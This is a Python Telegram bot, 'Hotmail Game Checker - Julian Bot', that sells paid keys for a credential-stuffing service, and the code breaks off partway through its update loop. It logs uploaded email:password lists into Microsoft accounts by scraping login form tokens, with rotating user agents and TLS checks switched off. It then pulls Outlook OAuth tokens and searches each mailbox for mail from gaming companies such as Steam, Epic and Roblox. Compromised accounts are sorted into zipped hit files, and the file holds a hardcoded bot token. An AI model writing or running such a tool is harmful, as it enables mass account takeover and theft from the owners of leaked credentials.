import sys, os, re, json, time, random, threading, requests, zipfile
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timedelta
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from email.utils import parsedate_to_datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8847630217:AAGcuENjLnIzHtUBbvxnKDBoa_DxW2a8yE0"
ADMIN_ID = 7969180514
ADMIN_USERNAME = "@imkansizligim"

THREAD_COUNT = 10
ADMIN_THREAD = 10

KEY_FILE = "keys.json"
USER_FILE = "users.json"
BACKUP_FILE = "backup.json"

HITS_FILE = "hotmailbothits.txt"
TWOFA_FILE = "checkerbot2FA.txt"
ZIP_FILE = "hotmailgamechecker.zip"

GAME_EMAILS = {
    "supercell": {"email": "noreply@id.supercell.com", "file": "supercellbothits.txt", "label": "🎮 SUPERCELL"},
    "konami": {"email": "konami-info@konami.net", "file": "konamibothits.txt", "label": "🕹️ KONAMI"},
    "pubg": {"email": "noreply@pubgmobile.com", "file": "pubgbothits.txt", "label": "🔫 PUBG"},
    "ea": {"email": "EA@e.ea.com", "file": "eabothits.txt", "label": "⚽ EA"},
    "epic": {"email": "help@acct.epicgames.com", "file": "epicbothits.txt", "label": "🎯 EPIC"},
    "steam": {"email": "noreply@steampowered.com", "file": "steambothits.txt", "label": "🎮 STEAM"},
    "riot": {"email": "noreply@mail.accounts.riotgames.com", "file": "riotbothits.txt", "label": "⚔️ RIOT"},
    "roblox": {"email": "no-reply@roblox.com", "file": "robloxbothits.txt", "label": "🎲 ROBLOX"},
    "discord": {"email": "noreply@discord.com", "file": "discordbothits.txt", "label": "💬 DISCORD"},
    "mojang": {"email": "noreply@mojang.com", "file": "mojangbothits.txt", "label": "⛏️ MOJANG"},
}

PLANS = {
    "free": {"name": "Free", "daily_limit": 5000, "single_limit": 1500, "duration": None, "thread": 10},
    "daily": {"name": "Daily", "daily_limit": 0, "single_limit": 3000, "duration": 24, "thread": 10},
    "weekly": {"name": "Weekly", "daily_limit": 0, "single_limit": 5000, "duration": 168, "thread": 10},
    "monthly": {"name": "Monthly", "daily_limit": 0, "single_limit": 7000, "duration": 720, "thread": 10},
    "admin": {"name": "Admin", "daily_limit": 0, "single_limit": 0, "duration": None, "thread": None},
}

bakim_modu = False
tarama_durdur = {}
sira_kuyruk = {}
multi_bekleyen = {}
bekleyen_hesaplar = {}

keys_db = {}
users_db = {}

def load_db():
    global keys_db, users_db
    try:
        if os.path.exists(KEY_FILE):
            with open(KEY_FILE, 'r') as f:
                keys_db = json.load(f)
    except:
        keys_db = {}
    try:
        if os.path.exists(USER_FILE):
            with open(USER_FILE, 'r') as f:
                users_db = json.load(f)
    except:
        users_db = {}

def save_db():
    try:
        with open(KEY_FILE, 'w') as f:
            json.dump(keys_db, f, indent=2)
    except:
        pass
    try:
        with open(USER_FILE, 'w') as f:
            json.dump(users_db, f, indent=2)
    except:
        pass

def get_user_plan(chat_id):
    if str(chat_id) == str(ADMIN_ID):
        return "admin"
    user_id = str(chat_id)
    if user_id in users_db:
        user_data = users_db[user_id]
        plan = user_data.get("plan", "free")
        key_expires = user_data.get("key_expires")
        
        if plan != "free" and key_expires:
            expiry = datetime.fromisoformat(key_expires)
            if datetime.now() > expiry:
                users_db[user_id]["plan"] = "free"
                users_db[user_id]["key_expires"] = None
                users_db[user_id]["daily_used"] = 0
                save_db()
                send_message(chat_id, "⚠️ YOUR PLAN HAS EXPIRED\n\n📋 New Plan: Free")
                return "free"
            return plan
        
        return plan
    
    users_db[user_id] = {"plan": "free", "daily_used": 0, "last_reset": datetime.now().strftime('%Y-%m-%d')}
    save_db()
    return "free"

def get_plan_info(plan):
    return PLANS.get(plan, PLANS["free"])

def check_daily_reset(chat_id):
    user_id = str(chat_id)
    if user_id in users_db:
        today = datetime.now().strftime('%Y-%m-%d')
        last_reset = users_db[user_id].get("last_reset", today)
        if last_reset != today:
            users_db[user_id]["daily_used"] = 0
            users_db[user_id]["last_reset"] = today
            save_db()

def get_remaining_daily(chat_id):
    check_daily_reset(chat_id)
    plan = get_user_plan(chat_id)
    plan_info = get_plan_info(plan)
    daily_limit = plan_info["daily_limit"]
    if daily_limit == 0:
        return 999999999  # Sınırsız
    user_id = str(chat_id)
    daily_used = users_db.get(user_id, {}).get("daily_used", 0)
    return daily_limit - daily_used

def send_message(chat_id, text, reply_markup=None):
    try:
        data = {"chat_id": chat_id, "text": text}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=15)
    except:
        pass

def send_document(chat_id, filepath):
    try:
        with open(filepath, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                          data={"chat_id": chat_id},
                          files={"document": (os.path.basename(filepath), f)}, timeout=30)
    except:
        pass

def download_file(file_id):
    try:
        file_info = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
                                 params={"file_id": file_id}, timeout=15).json()
        if not file_info.get("ok"):
            return None
        file_path = file_info["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        content = requests.get(file_url, timeout=30).text
        return content
    except:
        return None

def generate_key(key_type):
    import secrets
    import string
    chars = string.ascii_uppercase + string.digits
    code = ''.join(secrets.choice(chars) for _ in range(4))
    code2 = ''.join(secrets.choice(chars) for _ in range(4))
    key = f"JULIANBOT-{key_type.upper()}-{code}-{code2}"
    
    keys_db[key] = {
        "type": key_type,
        "expires": None,  # Süre kullanılınca başlayacak
        "bound_to": None,
        "created": datetime.now().isoformat()
    }
    save_db()
    return key

def kerpetennecmi(line):
    line = line.strip()
    if not line:
        return None
    for sep in (":", "|", ";", ","):
        if sep in line:
            parts = line.split(sep, 1)
            email, pwd = parts[0].strip(), parts[1].strip()
            if email and pwd and "@" in email:
                return f"{email}:{pwd}"
    return None

def cokludosyayukle(dosya_listesi):
    tum_hesaplar = []
    for dosya in dosya_listesi:
        dosya = dosya.strip()
        if not dosya:
            continue
        if not os.path.exists(dosya):
            continue
        try:
            with open(dosya, 'r', encoding='utf-8', errors='ignore') as f:
                satirlar = [l.strip() for l in f if ':' in l.strip() and not l.strip().startswith('#')]
            for satir in satirlar:
                norm = kerpetennecmi(satir)
                if norm:
                    tum_hesaplar.append(norm)
        except:
            pass
    benzersiz = list(dict.fromkeys(tum_hesaplar))
    return benzersiz

batmanparkyetkilisi = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

def ataturkparki():
    return random.choice(batmanparkyetkilisi)

class marazali:
    REQ = 25

    def __init__(self, email, password, proxy=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.s = self.toyotacorollabest()
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}
        self.cid = ""
        self.gelsinhayatbildigigibi = None
        self.bilmemhangiruzgaratti = None
        self.sahteparantezleracmasakin = (
            "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )

    def toyotacorollabest(self):
        s = requests.Session()
        retry = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
        s.mount("https://", adapter)
        s.mount("http://", adapter)
        return s

    def nihathatipoglu(self, tag):
        try:
            h = {
                "User-Agent": ataturkparki(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
            }
            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False)
            text = r.text
            m = (re.search(r'value=\\"(.+?)\\"', text, re.S)
                 or re.search(r'value="(.+?)"', text, re.S)
                 or re.search(r"sFTTag:'(.+?)'", text, re.S)
                 or re.search(r'sFTTag:"(.+?)"', text, re.S)
                 or re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))
            if not m:
                return "BAD"
            sFTTag = m.group(1)
            m2 = (re.search(r'"urlPost":"(.+?)"', text, re.S)
                  or re.search(r"urlPost:'(.+?)'", text, re.S)
                  or re.search(r'urlPost:"(.+?)"', text, re.S)
                  or re.search(r'<form.*?action="(.+?)"', text, re.S))
            if not m2:
                return "BAD"
            urlPost = m2.group(1).replace("&amp;", "&")
            data = {
                "login": self.email,
                "loginfmt": self.email,
                "passwd": self.password,
                "PPFT": sFTTag
            }
            h2 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": ataturkparki(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "close"
            }
            r2 = self.s.post(urlPost, data=data, headers=h2,
                             allow_redirects=True, timeout=self.REQ, verify=False)
            if "#" in r2.url and r2.url != self.sahteparantezleracmasakin:
                token = parse_qs(urlparse(r2.url).fragment).get("access_token", ["None"])[0]
                if token != "None":
                    self.gelsinhayatbildigigibi = token
                    return "SUCCESS"
            if "cancel?mkt=" in r2.text:
                try:
                    kotukardesim = re.search(r'(?<="ipt" value=").+?(?=">)', r2.text)
                    oyleeeemi = re.search(r'(?<="pprid" value=").+?(?=">)', r2.text)
                    hmmm = re.search(r'(?<="uaid" value=").+?(?=">)', r2.text)
                    if kotukardesim and oyleeeemi and hmmm:
                        dota2mioynuyoz = {"ipt": kotukardesim.group(), "pprid": oyleeeemi.group(), "uaid": hmmm.group()}
                        action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r2.text)
                        if action:
                            ret = self.s.post(action.group(), data=dota2mioynuyoz,
                                              allow_redirects=True, timeout=self.REQ, verify=False)
                            kurmancihergulee = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            if kurmancihergulee:
                                fin = self.s.get(kurmancihergulee.group(), allow_redirects=True,
                                                 timeout=self.REQ, verify=False)
                                token = parse_qs(urlparse(fin.url).fragment).get("access_token", ["None"])[0]
                                if token != "None":
                                    self.gelsinhayatbildigigibi = token
                                    return "SUCCESS"
                except:
                    pass
            if any(v in r2.text for v in [
                "recover?mkt", "account.live.com/identity/confirm?mkt",
                "Email/Confirm?mkt", "/Abuse?mkt=", ",AC:null,urlFedConvertRename"
            ]):
                return "2FA"
            fatihterim = r2.text.lower()
            if any(v in fatihterim for v in [
                "password is incorrect", "account doesn't exist",
                "that microsoft account doesn't exist",
                "sign in to your microsoft account",
                "tried to sign in too many times",
                "help us protect your account", "your account or password is incorrect"
            ]):
                return "BAD"
            return "BAD"
        except:
            return "ERROR"

    def kimseyisevemem(self, tag):
        try:
            self.sahteparantezleracmasakin = (
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=00000000402B5328"
                "&response_type=token"
                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&prompt=none"
            )
            h = {"User-Agent": ataturkparki()}
            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
            parsed = urlparse(r.url)
            if parsed.fragment:
                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
                if tok:
                    self.gelsinhayatbildigigibi = tok
                    return tok
            self.soyleyememyeminederim = (
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=0000000048170EF2"
                "&response_type=token"
                "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&prompt=none"
            )
            r = self.s.get(self.soyleyememyeminederim, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
            parsed = urlparse(r.url)
            if parsed.fragment:
                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
                if tok:
                    self.bilmemhangiruzgaratti = tok
                    return tok
            return None
        except:
            return None

    def ahhhelerimtitriyor(self, tag):
        try:
            pikniksararbugunlerde = self.s.cookies.get("MSPCID", "")
            if pikniksararbugunlerde:
                self.cid = pikniksararbugunlerde.upper()
                return True
            ofbiratesbasiyor = re.search(r'MSPCID=([^;\s]+)', str(self.s.cookies))
            if ofbiratesbasiyor:
                self.cid = ofbiratesbasiyor.group(1).upper()
                return True
            self.cid = self.email.upper().replace("@", "").replace(".", "")
            return True
        except:
            return False

    def search_sender_messages(self, tag, sender_email, token):
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            params = {"n": "124", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"}
            query = f'from:"{sender_email}"'
            body = {
                "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "RefiningQueries": None,
                    "Size": 500,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "AnswerEntityRequests": [{
                    "Query": {"QueryString": query},
                    "EntityTypes": ["Event", "File"],
                    "From": 0,
                    "Size": 10,
                    "EnableAsyncResolution": True
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"]
                },
                "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
            }
            h = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{self.cid}",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json",
            }
            r = self.s.post(url, params=params, headers=h, json=body, timeout=self.REQ, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                total = 0
                son_tarih = None
                
                for es in data.get("EntitySets", []):
                    if es.get("Total") is not None:
                        total = es.get("Total", 0)
                        break
                
                for es in data.get("EntitySets", []):
                    results = es.get("Results", [])
                    if results:
                        first_result = results[0]
                        date_str = first_result.get("DateTimeReceived") or first_result.get("DateTimeLastModified")
                        if date_str:
                            try:
                                son_tarih = parsedate_to_datetime(date_str)
                            except:
                                pass
                        break
                
                if total == 0:
                    total_match = re.search(r'"Total":\s*(\d+)', r.text)
                    if total_match:
                        total = int(total_match.group(1))
                
                return total, son_tarih
            
            return 0, None
        except:
            return 0, None

    def check(self, tag):
        status = self.nihathatipoglu(tag)
        if status != "SUCCESS":
            return status, None
        self.ahhhelerimtitriyor(tag)
        token = self.kimseyisevemem(tag)
        if not token:
            return "BAD", None
        
        time.sleep(1)
        
        mesaj_info = {}
        
        for game_key, game_data in GAME_EMAILS.items():
            sender = game_data["email"]
            sayi, tarih = self.search_sender_messages(tag, sender, token)
            mesaj_info[game_key] = {
                "sayi": sayi,
                "tarih": tarih.strftime('%Y-%m-%d %H:%M:%S') if tarih else 'N/A'
            }
            time.sleep(0.5)
        
        return "SUCCESS", mesaj_info

def create_zip():
    try:
        with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
            all_files = [HITS_FILE, TWOFA_FILE]
            for game_key, game_data in GAME_EMAILS.items():
                all_files.append(game_data["file"])
            for f in all_files:
                if os.path.exists(f) and os.path.getsize(f) > 0:
                    zf.write(f, os.path.basename(f))
        return True
    except:
        return False

def benferooolum():
    all_files = [HITS_FILE, TWOFA_FILE]
    for game_key, game_data in GAME_EMAILS.items():
        all_files.append(game_data["file"])
    for f in all_files:
        with open(f, 'w', encoding='utf-8') as fh:
            pass

def ana_menu(chat_id):
    if str(chat_id) == str(ADMIN_ID):
        plan = "Admin"
        kalan = "Unlimited"
        thread = ADMIN_THREAD
    else:
        plan_name = get_user_plan(chat_id)
        plan_info = get_plan_info(plan_name)
        plan = plan_info["name"]
        
        user_id = str(chat_id)
        user_data = users_db.get(user_id, {})
        key_expires = user_data.get("key_expires")
        
        if key_expires and plan != "Free":
            expiry = datetime.fromisoformat(key_expires)
            remaining = expiry - datetime.now()
            days = remaining.days
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            kalan = f"{days}d {hours}h {minutes}m"
        else:
            kalan = "Unlimited"
        
        thread = plan_info["thread"]
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🚀 Start", "callback_data": "baslat"},
             {"text": "📂 Multi Scan", "callback_data": "multi_start"}],
            [{"text": "📊 Status", "callback_data": "durum"},
             {"text": "🔑 Enter Key", "callback_data": "key_giris"}],
        ]
    }
    
    if str(chat_id) == str(ADMIN_ID):
        keyboard["inline_keyboard"].insert(0, [{"text": "⚡ Thread Settings", "callback_data": "thread_menu"}])
        keyboard["inline_keyboard"].insert(2, [{"text": "🔑 Create Key", "callback_data": "key_olustur"}])
    
    text = (
        f"╔══════════════════════════════════════════════╗\n"
        f"║     HOTMAIL GAME CHECKER - JULIAN BOT       ║\n"
    )
    if str(chat_id) == str(ADMIN_ID):
        text += f"║     👑 ADMIN PANEL 👑                       ║\n"
    text += f"╚══════════════════════════════════════════════╝\n\n"
    text += f"📋 Plan: {plan}\n"
    text += f"⏳ Remaining: {kalan}\n"
    text += f"⚡ Thread: {thread}\n"
    
    send_message(chat_id, text, keyboard)

def durum_menu(chat_id):
    if str(chat_id) == str(ADMIN_ID):
        aktif_keyler = len([k for k, v in keys_db.items() if not v.get("expires") or datetime.fromisoformat(v["expires"]) > datetime.now()])
        satilan_keyler = len([k for k, v in keys_db.items() if v.get("bound_to")])
        toplam_kullanici = len(users_db)
        premium = len([u for u in users_db.values() if u.get("plan") != "free"])
        free = toplam_kullanici - premium
        
        text = (
            f"👑 ADMIN STATUS\n\n"
            f"📋 Plan: Admin\n"
            f"⏳ Remaining: Unlimited\n"
            f"📊 Scanning: Unlimited\n"
            f"⚡ Thread: {ADMIN_THREAD}\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Active Keys: {aktif_keyler}\n"
            f"Sold Keys: {satilan_keyler}\n"
            f"Total Users: {toplam_kullanici}\n"
            f"Premium: {premium}\n"
            f"Free: {free}"
        )
    else:
        plan_name = get_user_plan(chat_id)
        plan_info = get_plan_info(plan_name)
        plan = plan_info["name"]
        
        user_id = str(chat_id)
        user_data = users_db.get(user_id, {})
        key_expires = user_data.get("key_expires")
        
        if key_expires and plan != "Free":
            expiry = datetime.fromisoformat(key_expires)
            remaining = expiry - datetime.now()
            days = remaining.days
            hours = remaining.seconds // 3600
            kalan = f"{days}d {hours}h"
        else:
            kalan = "Unlimited"
        
        daily_limit = plan_info["daily_limit"]
        single_limit = plan_info["single_limit"]
        daily_used = user_data.get("daily_used", 0)
        
        if daily_limit > 0:
            kalan_hak = daily_limit - daily_used
        else:
            kalan_hak = "Unlimited"
        
        text = (
            f"📊 STATUS PANEL\n\n"
            f"📋 Plan: {plan}\n"
            f"⏳ Remaining: {kalan}\n"
            f"📊 Today: {daily_used}/{daily_limit if daily_limit > 0 else '∞'} scanned\n"
            f"📂 Single Scan: {single_limit if single_limit > 0 else '∞'}\n"
            f"⚡ Thread: {plan_info['thread']}\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Remaining today: {kalan_hak} accounts"
        )
    
    send_message(chat_id, text)

def key_menu(chat_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "📅 Daily Key (750 TCoin)", "callback_data": "key_daily"}],
            [{"text": "📆 Weekly Key (3.000 TCoin)", "callback_data": "key_weekly"}],
            [{"text": "🗓️ Monthly Key (9.000 TCoin)", "callback_data": "key_monthly"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}],
        ]
    }
    send_message(chat_id, "🔑 CREATE KEY", keyboard)

def keyler_listesi(chat_id):
    if str(chat_id) != str(ADMIN_ID):
        return
    
    aktif_keyler = []
    for key, data in keys_db.items():
        if data.get("expires"):
            expiry = datetime.fromisoformat(data["expires"])
            if expiry <= datetime.now():
                continue
        
        kalan = ""
        if data.get("expires"):
            expiry = datetime.fromisoformat(data["expires"])
            remaining = expiry - datetime.now()
            days = remaining.days
            hours = remaining.seconds // 3600
            kalan = f"{days}d {hours}h"
        else:
            kalan = "Not Started"
        
        bound = data.get("bound_to")
        sahip = f"👤 {bound}" if bound else "👤 Not Sold"
        
        type_label = PLANS[data["type"]]["name"]
        aktif_keyler.append(f"{key}\n📋 {type_label} | ⏳ {kalan} | {sahip}")
    
    if aktif_keyler:
        text = "📋 ACTIVE KEYS\n\n" + "\n\n".join(aktif_keyler) + f"\n\n━━━━━━━━━━━━━━━━━━\nTotal: {len(aktif_keyler)} keys"
    else:
        text = "📋 ACTIVE KEYS\n\nNo keys yet."
    
    send_message(chat_id, text)

def thread_menu(chat_id):
    if str(chat_id) != str(ADMIN_ID):
        return
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "1", "callback_data": "thread_1"},
             {"text": "2", "callback_data": "thread_2"},
             {"text": "3", "callback_data": "thread_3"}],
            [{"text": "4", "callback_data": "thread_4"},
             {"text": "5", "callback_data": "thread_5"},
             {"text": "10", "callback_data": "thread_10"}],
            [{"text": "15", "callback_data": "thread_15"},
             {"text": "20", "callback_data": "thread_20"},
             {"text": "25", "callback_data": "thread_25"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}],
        ]
    }
    send_message(chat_id, f"⚡ THREAD SETTINGS (ADMIN)\n\nCurrent: {ADMIN_THREAD} Thread", keyboard)

def rapor(chat_id):
    if str(chat_id) != str(ADMIN_ID):
        return
    
    aktif_keyler = len([k for k, v in keys_db.items() if not v.get("expires") or datetime.fromisoformat(v["expires"]) > datetime.now()])
    satilan_keyler = len([k for k, v in keys_db.items() if v.get("bound_to")])
    toplam_kullanici = len(users_db)
    premium = len([u for u in users_db.values() if u.get("plan") != "free"])
    free = toplam_kullanici - premium
    
    text = (
        f"📊 REPORT\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Keys Sold: {satilan_keyler}\n"
        f"Active Keys: {aktif_keyler}\n"
        f"Total Users: {toplam_kullanici}\n"
        f"Premium Users: {premium}\n"
        f"Free Users: {free}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✍️ Julian Bot"
    )
    send_message(chat_id, text)

def duyuru(chat_id, mesaj):
    if str(chat_id) != str(ADMIN_ID):
        return
    
    gonderilen = 0
    for user_id in users_db:
        try:
            send_message(int(user_id), f"📢 ANNOUNCEMENT\n\n{mesaj}")
            gonderilen += 1
        except:
            pass
    
    send_message(chat_id, f"✅ Announcement sent to {gonderilen} users.")

def bakim(chat_id):
    global bakim_modu
    if str(chat_id) != str(ADMIN_ID):
        return
    
    bakim_modu = not bakim_modu
    if bakim_modu:
        send_message(chat_id, "🔧 Bot is now in maintenance mode.\nUsers cannot scan.")
    else:
        send_message(chat_id, "✅ Bot is back online.")

def tarama_yap(chat_id, accounts, dosya_adi):
    global ADMIN_THREAD
    benferooolum()
    
    plan_name = get_user_plan(chat_id)
    plan_info = get_plan_info(plan_name)
    
    if str(chat_id) == str(ADMIN_ID):
        thread_sayisi = ADMIN_THREAD
    else:
        thread_sayisi = plan_info["thread"]
    
    dogrudogru = len(accounts)
    babasarkikalmadi = time.time()
    tarama_durdur[chat_id] = False
    
    egriegri = {"checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0}
    for game_key in GAME_EMAILS:
        egriegri[game_key] = 0
    
    lock = threading.Lock()
    semaphore = threading.BoundedSemaphore(thread_sayisi)
    
    sent = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                          data={"chat_id": chat_id, "text": "📊 Scanning started..."}, timeout=15).json()
    progress_message_id = sent["result"]["message_id"] if sent.get("ok") else None

    def check_one(combo):
        nonlocal egriegri
        try:
            if tarama_durdur.get(chat_id, False):
                semaphore.release()
                return
            email, password = combo.split(":", 1)
            tag = email.split("@")[0][:12]
            c = marazali(email, password, None)
            status, mesaj_info = c.check(tag)
            with lock:
                if status == "SUCCESS":
                    egriegri["hit"] += 1
                    with open(HITS_FILE, 'a', encoding='utf-8') as f:
                        f.write(combo + "\n")
                    if mesaj_info:
                        for game_key, game_data in GAME_EMAILS.items():
                            game_info = mesaj_info.get(game_key, {})
                            sayi = game_info.get("sayi", 0)
                            tarih = game_info.get("tarih", "N/A")
                            if sayi > 0:
                                egriegri[game_key] += 1
                                hit_line = f"{combo} | {game_data['label']} Messages: {sayi} | Last: {tarih}"
                                with open(game_data["file"], 'a', encoding='utf-8') as f:
                                    f.write(hit_line + "\n")
                                print(f"✅ {game_data['label']} {hit_line}", flush=True)
                elif status == "2FA":
                    egriegri["twofa"] += 1
                    with open(TWOFA_FILE, 'a', encoding='utf-8') as f:
                        f.write(combo + "\n")
                else:
                    egriegri["bad"] += 1
        except Exception as e:
            with lock:
                egriegri["errors"] += 1
        finally:
            with lock:
                egriegri["checked"] += 1
            semaphore.release()

    def progress_updater():
        nonlocal egriegri, dogrudogru, babasarkikalmadi
        while egriegri["checked"] < dogrudogru:
            time.sleep(3)
            if tarama_durdur.get(chat_id, False):
                break
            with lock:
                checked = egriegri["checked"]
                hit = egriegri["hit"]
                twofa = egriegri["twofa"]
                bad = egriegri["bad"]
                errors = egriegri["errors"]
            total = dogrudogru
            elapsed = time.time() - babasarkikalmadi
            yuzde = (checked / total) * 100 if total > 0 else 0
            cpm = (checked / elapsed) * 60 if elapsed > 0 else 0
            filled = int(20 * checked // total) if total > 0 else 0
            bar = '█' * filled + '░' * (20 - filled)
            mesaj = f"📊 SCANNING IN PROGRESS\n\n"
            mesaj += f"📁 File: {dosya_adi}\n"
            mesaj += f"📊 Progress: {checked}/{total} ({yuzde:.1f}%)\n"
            mesaj += f"{bar}\n\n"
            mesaj += f"✅ HIT: {hit}\n"
            for game_key, game_data in GAME_EMAILS.items():
                mesaj += f"{game_data['label']}: {egriegri[game_key]}\n"
            mesaj += f"\n🔐 2FA: {twofa}\n"
            mesaj += f"❌ BAD: {bad}\n"
            mesaj += f"⚠️ ERRORS: {errors}\n\n"
            mesaj += f"⏰ Elapsed: {int(elapsed)}s\n"
            mesaj += f"⚡ CPM: {int(cpm)}\n\n"
            mesaj += f"Stop: /stop"
            if progress_message_id:
                try:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
                                  data={"chat_id": chat_id, "message_id": progress_message_id, "text": mesaj}, timeout=15)
                except:
                    pass

    updater = threading.Thread(target=progress_updater, daemon=True)
    updater.start()

    threads = []
    for combo in accounts:
        if tarama_durdur.get(chat_id, False):
            break
        semaphore.acquire()
        t = threading.Thread(target=check_one, args=(combo,))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    elapsed = time.time() - babasarkikalmadi
    durdu = tarama_durdur.get(chat_id, False)
    zip_olustu = create_zip()
    
    stats = f"{'⏹️ SCAN STOPPED' if durdu else '✅ SCAN COMPLETED'} ({int(elapsed)}s)\n\n"
    stats += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    stats += f"🔱 Total: {dogrudogru}\n"
    stats += f"✅ Hit: {egriegri['hit']}\n"
    stats += f"❌ Bad: {egriegri['bad']}\n"
    stats += f"🔐 2FA: {egriegri['twofa']}\n\n"
    for game_key, game_data in GAME_EMAILS.items():
        stats += f"{game_data['label']}: {egriegri[game_key]}\n"
    stats += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    stats += f"📦 Sending result file..."
    send_message(chat_id, stats)
    
    if zip_olustu:
        send_document(chat_id, ZIP_FILE)
    
    # Bekleyen hesap varsa bildir
    if chat_id in bekleyen_hesaplar and bekleyen_hesaplar[chat_id].get("accounts"):
        kalan_sayi = len(bekleyen_hesaplar[chat_id]["accounts"])
        send_message(chat_id, f"📂 {kalan_sayi} more accounts remaining. Type /devam to continue.")
    else:
        bekleyen_hesaplar.pop(chat_id, None)

def telegram_bot():
    global offset, ADMIN_THREAD, bakim_modu
    load_db()
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                             params={"offset": offset, "timeout": 30}, timeout=35)
            data = r.json()
            if data.get("ok"):
                for update in data.get("result", []):
                    offset = update["update_id"] + 1
                    if "callback_query" in update:
                        cb = update["callback_query"]
                        chat_id = cb["message"]["chat"]["id"]
                        data_cb = cb["data"]
                        if data_cb == "main_menu":
                            ana_menu(chat_id)
                        elif data_cb == "durum":
                            durum_menu(chat_id)
                        elif data_cb == "baslat":
                            send_message(chat_id, "📂 Send your combo file. Scanning will start automatically.")
                        elif data_cb == "multi_start":
                            send_message(chat_id, "📂 Send your combo files. Type /bitti when done.")
